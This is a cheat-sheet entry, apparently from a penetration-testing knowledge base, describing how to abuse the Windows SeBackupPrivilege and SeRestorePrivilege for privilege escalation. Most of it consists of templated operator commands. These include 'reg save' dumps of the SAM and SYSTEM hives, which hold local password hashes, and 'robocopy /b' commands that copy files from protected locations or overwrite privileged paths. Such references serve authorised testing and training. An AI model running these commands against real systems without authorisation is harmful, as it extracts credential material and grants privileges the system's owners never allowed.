---
technique: SeBackup and SeRestore Abuse
category: privilege-escalation
targets: Windows Privileges
protocols: Local, SMB
remote_capable: false
tags: windows privilege-escalation sebackup serestore robocopy diskshadow
---

# SeBackup and SeRestore Abuse

SeBackupPrivilege and SeRestorePrivilege can read protected files or overwrite privileged paths when the token privilege is enabled.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Token privilege | Current token must include SeBackupPrivilege or SeRestorePrivilege |
| Read or write target | Operator must identify a protected file or restore path |
| Elevated shell | Some tools require high-integrity context to enable privileges |

## Windows

### Check privileges

#cmd #token

List current token privileges.

```cmd title:"List token privileges"
whoami /priv
```
<!-- cheat -->

### Backup SAM

#cmd #sebackup #registry

Save the SAM hive using backup semantics.

```cmd title:"Save SAM hive"
reg save HKLM\SAM "$output_file"
```
<!-- cheat
var output_file
-->

### Backup SYSTEM

#cmd #sebackup #registry

Save the SYSTEM hive using backup semantics.

```cmd title:"Save SYSTEM hive"
reg save HKLM\SYSTEM "$output_file"
```
<!-- cheat
var output_file
-->

### Copy protected file

#cmd #sebackup #robocopy

Copy a protected file with backup mode.

```cmd title:"Copy protected file with backup mode"
robocopy "$source_dir" "$dest_dir" "$file_name" /b
```
<!-- cheat
var source_dir
var dest_dir
var file_name
-->

### Restore file

#cmd #serestore #robocopy

Restore a file into a protected directory.

```cmd title:"Restore file with backup mode"
robocopy "$source_dir" "$dest_dir" "$file_name" /b
```
<!-- cheat
var source_dir
var dest_dir
var file_name
-->

## Linux

No Linux operator command is included here. This note covers Windows backup and restore privileges.
